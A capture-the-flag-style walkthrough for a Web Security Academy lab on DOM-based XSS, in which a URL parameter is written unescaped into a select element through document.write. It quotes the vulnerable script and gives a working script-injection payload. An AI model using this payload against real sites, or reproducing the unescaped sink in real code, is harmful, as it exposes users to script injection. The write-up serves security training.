# XSS LAB 10 - DOM XSS in document.write sink using source location.search inside a select element

## Manual Solution

### 1. Access the Lab
- Open the Web Security Academy lab environment in your browser.

### 2. Finding the vulnerable Script
- Click on view details of any product
- Right click and select view page source
- Find the vulnerable script

### 3. Understanding the vulnerabilty script
```js
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');

if(store) {
    document.write('<option selected>'+store+'</option>');
}

for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}

document.write('</select>');
```
- This script retrieves the storeId parameter from the URL and writes it as the selected option on the page.
- When we click the "Check Stock" button, a post request is sent to the server with the following data:
    - `productId : '1'`
    - `storeId: 'London'`
    - You can see this in the network tab
- We can see any storeId parameter we want on the page because this script retrieves the storeId parameter from the URL using window.location.search.

### 4. Solving the lab
- Search using the following payload `product?productId=1&storeId=<script>alert(1)</script>`
- An alert pop-up appears.

## Automated Solution

### 1. Download the script
### 2. Run the script with the following command:
```sh
python xss_lab_10.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)
``` 